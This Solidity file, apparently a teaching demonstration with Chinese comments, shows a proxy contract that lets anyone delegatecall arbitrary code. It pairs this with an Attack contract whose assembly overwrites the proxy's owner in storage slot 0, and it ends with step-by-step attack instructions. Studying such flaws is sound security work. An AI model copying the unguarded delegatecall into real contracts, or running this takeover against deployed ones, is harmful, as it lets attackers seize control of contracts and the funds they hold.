pragma solidity >=0.8.0;

// 漏洞示範：Delegatecall to Untrusted Callee
// 此合約允許任何人呼叫 forward() 函數，並以 delegatecall 的方式委派呼叫任意合約，
// 攻擊者可藉由傳入惡意合約地址及資料修改 Proxy 的狀態變數（例如 owner），導致合約權限被奪。

contract ProxyVulnerable {
    // 漏洞重點：狀態變數 owner，存放於 storage slot 0，可被 delegatecall 的惡意合約覆蓋
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    // 漏洞重點：forward 函數允許任意位址進行 delegatecall，若呼叫合約內的函示修改 slot 0，會造成權限轉移
    function forward(address _callee, bytes memory _data) public {
        (bool success, ) = _callee.delegatecall(_data);
        require(success, "delegatecall failed");
    }
}

// 攻擊合約：以最小可行的例子示範如何利用 delegatecall 弱點
contract Attack {
    // 此函數會在 ProxyVulnerable 的執行 context 下被呼叫，
    // 因此透過 sstore(0, caller()) 會將 ProxyVulnerable 的 owner 改為攻擊者的位址
    function pwn() public {
        assembly {
            // 修改 storage slot 0 (ProxyVulnerable.owner) 為呼叫者的位址
            sstore(0, caller())
        }
    }
}

/* 攻擊步驟說明：
   1. 攻擊者先部署 Attack 合約。
   2. 攻擊者呼叫 ProxyVulnerable.forward(attackAddress, payload)；
      其中 attackAddress 為 Attack 合約位址，payload 為 pwn() 函數的 function selector (例如：
         bytes4(keccak256("pwn()"))
      )。
   3. 因為 delegatecall 的關係，Attack 合約的 pwn() 函數會在 ProxyVulnerable 的 context 下被執行，
      將 ProxyVulnerable 的 owner 改成攻擊者的地址。
*/
